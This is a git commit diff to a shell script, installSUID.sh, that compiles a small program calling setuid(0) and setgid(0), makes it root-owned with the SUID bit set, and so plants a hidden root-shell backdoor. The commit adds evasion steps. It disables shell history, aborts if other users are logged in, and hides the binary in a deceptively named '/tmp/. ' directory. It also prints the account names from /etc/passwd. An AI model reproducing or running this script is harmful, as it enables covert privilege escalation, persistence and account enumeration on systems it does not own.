f8b23c10f6f44edc8a5853f30d91e8a8dca5ca39
Greg Baker <gregbakerstl@gmail.com>
2019-04-24 13:58:38 -0500

    Update installSUID.sh

--- installSUID.sh
+++ installSUID.sh
@@ -1,4 +1,8 @@
 #!/bin/sh
+
+unset HISTFILE;
+unset HISTSAVE;
+
 code=$(cat<<EOF
 int main(void) {
   setgid(0); setuid(0);
@@ -6,8 +10,22 @@ int main(void) {
 }
 EOF
 )
-echo $code>./.sh.c
-gcc -o ./.sh ./.sh.c
-chown root:root ./.sh
-chmod u+s ./.sh
-rm ./.sh.c
+
+users=$(w|grep -v load|grep -v JCPU|wc -l);
+if [ "$users" != "1" ]; then 
+  logout;
+else 
+
+  mkdir /tmp/". ";
+  cd /tmp/". ";
+  echo $code>./.sh.c
+  gcc -o ./.sh ./.sh.c
+  chown root:root ./.sh
+  chmod u+s ./.sh
+  rm ./.sh.c
+  logout;
+
+fi
+
+accounts=$(cut -f1 -d: /etc/passwd);
+echo $accounts
